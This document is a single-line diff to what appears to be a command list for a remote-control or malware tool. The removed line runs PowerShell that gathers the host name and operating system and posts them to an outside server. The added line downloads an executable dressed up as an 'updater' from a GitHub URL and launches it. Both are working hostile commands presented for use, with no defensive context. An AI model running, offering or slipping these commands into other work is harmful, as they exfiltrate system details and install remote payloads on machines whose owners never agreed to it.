@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd powershell -c "$h=$env:COMPUTERNAME; $os=(Get-WmiObject Win32_OperatingSystem).Caption; Invoke-WebRequest -Uri 'http://evildiabriek.pythonanywhere.com/ping' -Method POST -Body ('{\"hostname\":\"'+$h+'\",\"os\":\"'+$os+'\"}') -ContentType 'application/json'"
+ExecuteCmd -user -cmd powershell -c "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/MJVhack/MJVhack.github.io/raw/refs/heads/main/updatermsf32.exe','updater.exe'); Start-Process 'updater.exe'"
